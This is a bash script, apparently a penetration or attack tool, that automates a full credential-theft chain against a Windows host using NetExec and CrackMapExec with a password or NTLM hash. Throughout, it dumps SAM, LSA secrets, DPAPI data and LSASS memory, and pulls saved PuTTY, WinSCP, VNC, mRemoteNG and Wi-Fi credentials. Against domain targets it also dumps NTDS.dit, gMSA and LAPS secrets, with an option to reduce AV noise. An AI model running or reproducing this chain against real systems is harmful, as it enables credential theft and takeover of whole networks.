#!/bin/bash
# ============================================================
#  💀  Full Credential Attack Runner v4 — FULL CHAIN
#  NetExec (nxc) + CrackMapExec | All Modules
#  Author: @mohnad_style
# ============================================================
# Smart behavior:
#   • Auth fails          → abort immediately
#   • No "Pwn3d!"         → skip admin-only modules
#   • --local-auth        → skip domain-only modules (NTDS/gMSA/LAPS)
#   • --modules <list>    → run only specific modules
#   • --all               → run every single module (default)
#   • --no-lsass          → skip LSASS dumps (noisy)
#   • -o <dir>            → custom output folder
# ============================================================

# ── Colors ──────────────────────────────────────────────────
RED='\033[0;31m';     GREEN='\033[0;32m';   YELLOW='\033[1;33m'
BLUE='\033[0;34m';    CYAN='\033[0;36m';    MAGENTA='\033[0;35m'
WHITE='\033[1;37m';   BOLD='\033[1m';       DIM='\033[2m';  RESET='\033[0m'

# ── Banner ───────────────────────────────────────────────────
banner(){
echo -e "${RED}${BOLD}"
cat << 'EOF'
  ██████╗██████╗ ███████╗██████╗      ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
 ██╔════╝██╔══██╗██╔════╝██╔══██╗     ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
 ██║     ██████╔╝█████╗  ██║  ██║     ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
 ██║     ██╔══██╗██╔══╝  ██║  ██║     ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
 ╚██████╗██║  ██║███████╗██████╔╝     ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
  ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝      ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
EOF
echo -e "${RESET}"
echo -e "  ${DIM}${WHITE}💀  Full Credential Attack Chain v4 | NXC + CME | @mohnad_style${RESET}"
echo -e "  ${DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
}

# ── Usage ────────────────────────────────────────────────────
usage(){
banner
echo -e "${WHITE}${BOLD}  Usage:${RESET}"
echo -e "    ${CYAN}$0 <IP> <USER> <PASSWORD|NTLM_HASH> [OPTIONS]${RESET}"
echo ""
echo -e "${WHITE}${BOLD}  Options:${RESET}"
echo -e "    ${YELLOW}--local-auth${RESET}          Authenticate as local user (disables domain modules)"
echo -e "    ${YELLOW}--no-lsass${RESET}            Skip LSASS dumps (reduces noise/AV triggers)"
echo -e "    ${YELLOW}--all${RESET}                 Run ALL modules (default behavior)"
echo -e "    ${YELLOW}--modules <m1,m2,..>${RESET}  Run specific modules only"
echo -e "    ${YELLOW}-o <dir>${RESET}              Save results to custom output directory"
echo ""
echo -e "${WHITE}${BOLD}  Available Modules:${RESET}"
echo -e "    ${DIM}sam, lsa, winlogon, dpapi, lsassy, nanodump, mremoteng, putty,"
echo -e "    notepadpp, powershell_history, winscp, vnc, wifi, backup_operator,"
echo -e "    ntds, gmsa, laps${RESET}"
echo ""
echo -e "${WHITE}${BOLD}  Examples:${RESET}"
echo -e "    ${DIM}# Full chain — domain user + password${RESET}"
echo -e "    ${GREEN}$0 192.168.1.10 administrator Password123${RESET}"
echo ""
echo -e "    ${DIM}# Pass-the-Hash${RESET}"
echo -e "    ${GREEN}$0 192.168.1.10 administrator aad3b435b51404eeaad3b435b51404ee:97db5c87465431b9${RESET}"
echo ""
echo -e "    ${DIM}# Local admin, skip LSASS, save output${RESET}"
echo -e "    ${GREEN}$0 192.168.1.10 Administrator Password1 --local-auth --no-lsass -o /tmp/results${RESET}"
echo ""
echo -e "    ${DIM}# Run specific modules only${RESET}"
echo -e "    ${GREEN}$0 192.168.1.10 raj Password@1 --modules sam,lsa,laps${RESET}"
echo ""
exit 1
}

# ── Parse Args ───────────────────────────────────────────────
[[ $# -lt 3 ]] && usage

IP="$1"; USER="$2"; SECRET="$3"
LOCAL_AUTH=0; NO_LSASS=0; OUTDIR=""; CUSTOM_MODULES=""

shift 3
while [[ $# -gt 0 ]]; do
    case "$1" in
        --local-auth)         LOCAL_AUTH=1 ;;
        --no-lsass)           NO_LSASS=1 ;;
        --all)                ;;  # default, no-op
        --modules)            shift; CUSTOM_MODULES="$1" ;;
        -o)                   shift; OUTDIR="$1" ;;
        -h|--help)            usage ;;
        *) echo -e "${RED}[!] Unknown option: $1${RESET}"; usage ;;
    esac
    shift
done

# ── Detect Hash vs Password ──────────────────────────────────
# Supports formats:  32hex  |  LM:NT  |  :NT
if [[ "$SECRET" =~ ^[a-fA-F0-9]{32}$ ]] || \
   [[ "$SECRET" =~ ^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$ ]] || \
   [[ "$SECRET" =~ ^:[a-fA-F0-9]{32}$ ]]; then
    AUTH_TYPE="-H"; AUTH_LABEL="NTLM HASH"
else
    AUTH_TYPE="-p"; AUTH_LABEL="PASSWORD"
fi

AUTH_FLAG=""
[[ $LOCAL_AUTH -eq 1 ]] && AUTH_FLAG="--local-auth"

# ── Output directory ─────────────────────────────────────────
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
[[ -z "$OUTDIR" ]] && OUTDIR="./nxc_results_${IP}_${TIMESTAMP}"
mkdir -p "$OUTDIR"
LOGFILE="$OUTDIR/full_chain.log"

# ── Module selection ─────────────────────────────────────────
ALL_MODULES=(sam lsa winlogon dpapi lsassy nanodump mremoteng putty
             notepadpp powershell_history winscp vnc wifi
             backup_operator ntds gmsa laps)

if [[ -n "$CUSTOM_MODULES" ]]; then
    IFS=',' read -ra RUN_MODULES <<< "$CUSTOM_MODULES"
else
    RUN_MODULES=("${ALL_MODULES[@]}")
fi

should_run(){ local m="$1"; printf '%s\n' "${RUN_MODULES[@]}" | grep -qx "$m"; }

# ── Globals ──────────────────────────────────────────────────
STEP=0; TOTAL_STEPS=0; PASS_COUNT=0; FAIL_COUNT=0; SKIP_COUNT=0
declare -A RESULTS
IS_ADMIN=0    # set to 1 if "Pwn3d!" detected
IS_DOMAIN=0   # set to 1 if domain context (no --local-auth)
[[ $LOCAL_AUTH -eq 0 ]] && IS_DOMAIN=1

# Count total steps upfront
count_steps(){
    local count=1  # always: auth check
    for m in "${RUN_MODULES[@]}"; do
        case "$m" in
            lsassy|nanodump) [[ $NO_LSASS -eq 1 ]] && continue ;;
            ntds|gmsa|laps)  [[ $IS_DOMAIN -eq 0 ]] && continue ;;
        esac
        ((count++))
    done
    echo $count
}
TOTAL_STEPS=$(count_steps)

# ── Helper: run_step ─────────────────────────────────────────
run_step(){
    local title="$1" icon="$2" color="$3"
    local -n _cmd_arr=$4  # nameref to command array
    ((STEP++))

    echo -e "\n${color}${BOLD}"
    echo   "  ┌──────────────────────────────────────────────────────────────────┐"
    printf "  │  %s  Step %02d/%02d  │  %-46s│\n" "$icon" "$STEP" "$TOTAL_STEPS" "$title"
    echo   "  └──────────────────────────────────────────────────────────────────┘"
    echo -e "${RESET}"

    echo -e "  ${DIM}[CMD]${RESET} ${WHITE}${_cmd_arr[*]}${RESET}"
    echo -e "${DIM}  ────────────────────────────────────────────────────────────────────${RESET}"

    local tmpfile; tmpfile=$(mktemp /tmp/nxc_step_XXXXXX)

    if command -v unbuffer &>/dev/null; then
        unbuffer "${_cmd_arr[@]}" 2>&1 | tee >(sed 's/\x1b\[[0-9;]*m//g' > "$tmpfile")
    else
        script -q -c "${_cmd_arr[*]}" /dev/null 2>&1 | tee >(sed 's/\x1b\[[0-9;]*m//g' > "$tmpfile")
    fi

    local plain; plain=$(cat "$tmpfile")
    # Also append to master log
    echo "=== Step $STEP: $title ===" >> "$LOGFILE"
    echo "${_cmd_arr[*]}" >> "$LOGFILE"
    cat "$tmpfile" >> "$LOGFILE"
    echo "" >> "$LOGFILE"
    rm -f "$tmpfile"

    echo -e "${DIM}  ────────────────────────────────────────────────────────────────────${RESET}"

    # ── Result detection ──────────────────────────────────────
    local status="UNKNOWN"

    if echo "$plain" | grep -qi "Pwn3d!"; then
        status="PWNED"; IS_ADMIN=1
        echo -e "  ${GREEN}${BOLD}[👑] PWNED — Admin access confirmed!${RESET}"
        RESULTS["$title"]="${GREEN}${BOLD}👑 PWNED${RESET}"
        ((PASS_COUNT++))

    elif echo "$plain" | grep -qi "\[+\]\|SUCCESS\|STATUS_SUCCESS"; then
        status="SUCCESS"
        echo -e "  ${GREEN}${BOLD}[✔] SUCCESS${RESET} — $title"
        RESULTS["$title"]="${GREEN}✔ SUCCESS${RESET}"
        ((PASS_COUNT++))

    elif echo "$plain" | grep -qi "STATUS_LOGON_FAILURE\|STATUS_ACCESS_DENIED\|\[-\] Login failed\|\[-\] Authentication failed"; then
        status="AUTH_FAILED"
        echo -e "  ${RED}${BOLD}[✗] AUTH FAILED${RESET} — $title"
        RESULTS["$title"]="${RED}✗ AUTH FAILED${RESET}"
        ((FAIL_COUNT++))

    elif echo "$plain" | grep -qi "error\|exception\|traceback\|not found\|No module named"; then
        status="ERROR"
        echo -e "  ${YELLOW}[!] ERROR${RESET} — $title encountered an error"
        RESULTS["$title"]="${YELLOW}! ERROR${RESET}"
        ((FAIL_COUNT++))

    else
        status="DONE"
        echo -e "  ${CYAN}[~] DONE${RESET} — $title completed (check log for details)"
        RESULTS["$title"]="${CYAN}~ DONE${RESET}"
        ((PASS_COUNT++))
    fi

    echo "$status"
}

# ── Smart skip messages ──────────────────────────────────────
skip_step(){
    local title="$1" icon="$2" reason="$3"
    ((SKIP_COUNT++))
    echo -e "  ${DIM}$icon  %-30s → ⏭  Skipped: $reason${RESET}" "$title"
    RESULTS["$title"]="${DIM}⏭ SKIPPED: $reason${RESET}"
}

# ════════════════════════════════════════════════════════════
# ══  MAIN                                                  ══
# ════════════════════════════════════════════════════════════
banner

# ── Mission Briefing ─────────────────────────────────────────
echo -e "${WHITE}${BOLD}"
echo "  ╔══════════════════════════════════════════════════════════════════╗"
echo "  ║                    🎯  MISSION BRIEFING                          ║"
echo "  ╚══════════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"
echo -e "  ${DIM}Target IP     :${RESET}  ${CYAN}${BOLD}$IP${RESET}"
echo -e "  ${DIM}Username      :${RESET}  ${WHITE}$USER${RESET}"
if [[ "$AUTH_TYPE" == "-H" ]]; then
    echo -e "  ${DIM}Auth Type     :${RESET}  ${MAGENTA}${BOLD}NTLM HASH${RESET} ${DIM}(Pass-the-Hash)${RESET}"
    echo -e "  ${DIM}Hash          :${RESET}  ${YELLOW}$SECRET${RESET}"
else
    echo -e "  ${DIM}Auth Type     :${RESET}  ${GREEN}${BOLD}PASSWORD${RESET}"
    echo -e "  ${DIM}Password      :${RESET}  ${YELLOW}$SECRET${RESET}"
fi
echo -e "  ${DIM}Local Auth    :${RESET}  $( [[ $LOCAL_AUTH -eq 1 ]] && echo "${RED}${BOLD}YES${RESET} ${DIM}(domain modules disabled)${RESET}" || echo "${DIM}NO (domain context)${RESET}" )"
echo -e "  ${DIM}LSASS Dumps   :${RESET}  $( [[ $NO_LSASS -eq 1 ]] && echo "${YELLOW}DISABLED${RESET}" || echo "${DIM}Enabled${RESET}" )"
echo -e "  ${DIM}Output Dir    :${RESET}  ${DIM}$OUTDIR${RESET}"
echo -e "  ${DIM}Log File      :${RESET}  ${DIM}$LOGFILE${RESET}"
echo -e "  ${DIM}Total Steps   :${RESET}  ${WHITE}${BOLD}$TOTAL_STEPS${RESET}"
echo ""

# ── Start ────────────────────────────────────────────────────
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BLUE}${BOLD}  ⚔  STARTING ATTACK CHAIN${RESET}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"

# ════════════════════════════════════════════════════════════
# ═  STEP 0 — SMB Auth Check (ALWAYS — abort if fail)       ═
# ════════════════════════════════════════════════════════════
cmd_auth=(nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG)
result=$(run_step "SMB Auth Check" "🔐" "$CYAN" cmd_auth)

if [[ "$result" == "AUTH_FAILED" ]]; then
    echo ""
    echo -e "${RED}${BOLD}"
    echo "  ╔══════════════════════════════════════════════════════╗"
    echo "  ║  ⛔  AUTHENTICATION FAILED — ABORTING CHAIN         ║"
    echo "  ╚══════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
    echo -e "  ${DIM}Credentials rejected by $IP — check username/password/hash.${RESET}"
    echo -e "  ${DIM}Log saved to: $LOGFILE${RESET}"
    exit 1
fi

[[ "$result" == "PWNED" ]] && IS_ADMIN=1 || IS_ADMIN=0

echo -e "\n  ${DIM}Admin status:${RESET} $( [[ $IS_ADMIN -eq 1 ]] && echo "${GREEN}${BOLD}YES (Pwn3d!)${RESET}" || echo "${YELLOW}No admin rights detected — some modules may fail${RESET}" )"

# ════════════════════════════════════════════════════════════
# ═  MODULES                                                ═
# ════════════════════════════════════════════════════════════

# ── SAM ─────────────────────────────────────────────────────
if should_run sam; then
    if [[ $IS_ADMIN -eq 1 ]]; then
        cmd=(crackmapexec smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG --sam)
        run_step "SAM Database Dump" "🗄" "$YELLOW" cmd
    else
        skip_step "SAM Database Dump" "🗄" "requires admin (Pwn3d!)"
    fi
fi

# ── LSA ─────────────────────────────────────────────────────
if should_run lsa; then
    if [[ $IS_ADMIN -eq 1 ]]; then
        cmd=(crackmapexec smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG --lsa)
        run_step "LSA Secrets Dump" "🔑" "$MAGENTA" cmd
    else
        skip_step "LSA Secrets Dump" "🔑" "requires admin (Pwn3d!)"
    fi
fi

# ── WINLOGON ─────────────────────────────────────────────────
if should_run winlogon; then
    cmd=(nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG -M reg-winlogon)
    run_step "Winlogon Registry Dump" "🪟" "$YELLOW" cmd
fi

# ── DPAPI ────────────────────────────────────────────────────
if should_run dpapi; then
    cmd=(nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG --dpapi)
    run_step "DPAPI Credentials Dump" "🗝" "$CYAN" cmd
fi

# ── LSASSY ───────────────────────────────────────────────────
if should_run lsassy; then
    if [[ $NO_LSASS -eq 1 ]]; then
        skip_step "LSASS Dump (lsassy)" "🧠" "--no-lsass flag set"
    elif [[ $IS_ADMIN -eq 1 ]]; then
        cmd=(nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG -M lsassy)
        run_step "LSASS Dump (lsassy)" "🧠" "$RED" cmd
    else
        skip_step "LSASS Dump (lsassy)" "🧠" "requires admin (Pwn3d!)"
    fi
fi

# ── NANODUMP ─────────────────────────────────────────────────
if should_run nanodump; then
    if [[ $NO_LSASS -eq 1 ]]; then
        skip_step "LSASS Dump (nanodump)" "💉" "--no-lsass flag set"
    elif [[ $IS_ADMIN -eq 1 ]]; then
        cmd=(nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG -M nanodump)
        run_step "LSASS Dump (nanodump)" "💉" "$RED" cmd
    else
        skip_step "LSASS Dump (nanodump)" "💉" "requires admin (Pwn3d!)"
    fi
fi

# ── mRemoteNG ────────────────────────────────────────────────
if should_run mremoteng; then
    cmd=(nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG -M mremoteng)
    run_step "mRemoteNG Saved Creds" "🖥" "$GREEN" cmd
fi

# ── PuTTY ────────────────────────────────────────────────────
if should_run putty; then
    cmd=(nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG -M putty)
    run_step "PuTTY Private Keys" "🐢" "$CYAN" cmd
fi

# ── Notepad++ ────────────────────────────────────────────────
if should_run notepadpp; then
    cmd=(nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG -M notepad++)
    run_step "Notepad++ Session Logs" "📝" "$DIM$WHITE" cmd
fi

# ── PowerShell History ───────────────────────────────────────
if should_run powershell_history; then
    cmd=(nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG -M powershell_history)
    run_step "PowerShell Command History" "⚡" "$BLUE" cmd
fi

# ── WinSCP ───────────────────────────────────────────────────
if should_run winscp; then
    cmd=(nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG -M winscp)
    run_step "WinSCP Saved Sessions" "📂" "$CYAN" cmd
fi

# ── VNC ──────────────────────────────────────────────────────
if should_run vnc; then
    cmd=(nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG -M vnc)
    run_step "VNC Password Dump" "👁" "$MAGENTA" cmd
fi

# ── Wi-Fi ────────────────────────────────────────────────────
if should_run wifi; then
    if [[ $IS_ADMIN -eq 1 ]]; then
        cmd=(nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG -M wifi)
        run_step "Wi-Fi Credentials" "📶" "$YELLOW" cmd
    else
        skip_step "Wi-Fi Credentials" "📶" "requires admin (Pwn3d!)"
    fi
fi

# ── WinRM Check (always useful after auth confirmed) ─────────
cmd_winrm=(nxc winrm "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG)
run_step "WinRM Access Check" "💻" "$GREEN" cmd_winrm

# ════════════════════════════════════════════════════════════
# ═  DOMAIN-ONLY MODULES (skipped with --local-auth)        ═
# ════════════════════════════════════════════════════════════
echo ""
if [[ $IS_DOMAIN -eq 0 ]]; then
    echo -e "  ${DIM}[ℹ] Local-auth mode — skipping domain-only modules (backup_operator, ntds, gmsa, laps)${RESET}"
    for m in backup_operator ntds gmsa laps; do
        should_run "$m" && skip_step "$m" "🏛" "--local-auth: domain modules disabled"
    done
else
    # ── Backup Operators ──────────────────────────────────────
    if should_run backup_operator; then
        cmd=(nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" -M backup_operator)
        run_step "Backup Operators Check" "🛡" "$YELLOW" cmd
    fi

    # ── NTDS.dit ──────────────────────────────────────────────
    if should_run ntds; then
        if [[ $IS_ADMIN -eq 1 ]]; then
            cmd=(nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" --ntds)
            run_step "NTDS.dit Domain Hash Dump" "🏆" "$RED" cmd
        else
            skip_step "NTDS.dit Domain Hash Dump" "🏆" "requires domain admin (Pwn3d!)"
        fi
    fi

    # ── gMSA ──────────────────────────────────────────────────
    if should_run gmsa; then
        cmd=(nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" --gmsa)
        run_step "gMSA Credentials" "⚙" "$MAGENTA" cmd
    fi

    # ── LAPS ──────────────────────────────────────────────────
    if should_run laps; then
        cmd=(nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" -M laps)
        run_step "LAPS Local Admin Password" "🔒" "$GREEN" cmd
    fi
fi

# ════════════════════════════════════════════════════════════
# ═  SUMMARY                                                ═
# ════════════════════════════════════════════════════════════
echo ""
echo -e "${WHITE}${BOLD}"
echo "  ╔══════════════════════════════════════════════════════════════════╗"
echo "  ║                    📊  ATTACK SUMMARY                            ║"
echo "  ╚══════════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"
echo -e "  ${DIM}Target:${RESET} ${CYAN}$IP${RESET}   ${DIM}User:${RESET} ${WHITE}$USER${RESET}   ${DIM}Auth:${RESET} ${YELLOW}$AUTH_LABEL${RESET}"
echo -e "  ${DIM}Admin:${RESET}  $( [[ $IS_ADMIN -eq 1 ]] && echo "${GREEN}${BOLD}YES (Pwn3d!)${RESET}" || echo "${YELLOW}NO${RESET}" )   ${DIM}Domain context:${RESET} $( [[ $IS_DOMAIN -eq 1 ]] && echo "${GREEN}YES${RESET}" || echo "${YELLOW}NO${RESET}" )"
echo ""

declare -A STEP_ICONS=(
    ["SMB Auth Check"]="🔐"
    ["SAM Database Dump"]="🗄"
    ["LSA Secrets Dump"]="🔑"
    ["Winlogon Registry Dump"]="🪟"
    ["DPAPI Credentials Dump"]="🗝"
    ["LSASS Dump (lsassy)"]="🧠"
    ["LSASS Dump (nanodump)"]="💉"
    ["mRemoteNG Saved Creds"]="🖥"
    ["PuTTY Private Keys"]="🐢"
    ["Notepad++ Session Logs"]="📝"
    ["PowerShell Command History"]="⚡"
    ["WinSCP Saved Sessions"]="📂"
    ["VNC Password Dump"]="👁"
    ["Wi-Fi Credentials"]="📶"
    ["WinRM Access Check"]="💻"
    ["Backup Operators Check"]="🛡"
    ["NTDS.dit Domain Hash Dump"]="🏆"
    ["gMSA Credentials"]="⚙"
    ["LAPS Local Admin Password"]="🔒"
)

for step_name in \
    "SMB Auth Check" "SAM Database Dump" "LSA Secrets Dump" \
    "Winlogon Registry Dump" "DPAPI Credentials Dump" \
    "LSASS Dump (lsassy)" "LSASS Dump (nanodump)" \
    "mRemoteNG Saved Creds" "PuTTY Private Keys" \
    "Notepad++ Session Logs" "PowerShell Command History" \
    "WinSCP Saved Sessions" "VNC Password Dump" "Wi-Fi Credentials" \
    "WinRM Access Check" "Backup Operators Check" \
    "NTDS.dit Domain Hash Dump" "gMSA Credentials" "LAPS Local Admin Password"
do
    [[ -z "${RESULTS[$step_name]+_}" ]] && continue
    icon="${STEP_ICONS[$step_name]:-•}"
    printf "  %s  %-35s → " "$icon" "$step_name"
    echo -e "${RESULTS[$step_name]}"
done

echo ""
echo -e "  ${GREEN}${BOLD}Passed: $PASS_COUNT${RESET}   ${RED}${BOLD}Failed: $FAIL_COUNT${RESET}   ${DIM}Skipped: $SKIP_COUNT${RESET}"

# ── Log hints ────────────────────────────────────────────────
echo ""
echo -e "${DIM}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${DIM}  📁 Output:  $OUTDIR${RESET}"
echo -e "${DIM}  📋 Full log: $LOGFILE${RESET}"
echo -e "${DIM}  🗂  NXC logs: ~/.nxc/logs/   CME logs: ~/.cme/logs/${RESET}"

echo ""
echo -e "${GREEN}${BOLD}"
echo "  ╔══════════════════════════════════════════════════════╗"
echo "  ║  ✅  Attack Chain Complete — @mohnad_style           ║"
echo "  ╚══════════════════════════════════════════════════════╝"
echo -e "${RESET}"
